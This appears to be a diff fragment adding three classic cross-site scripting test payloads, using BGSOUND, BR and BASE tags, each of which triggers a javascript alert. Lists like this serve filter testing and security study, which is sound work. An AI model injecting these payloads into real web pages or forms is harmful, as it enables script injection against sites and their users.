@@ -1,0 +1,3 @@
+<BGSOUND SRC="javascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<BASE HREF="javascript:alert('XSS');//">
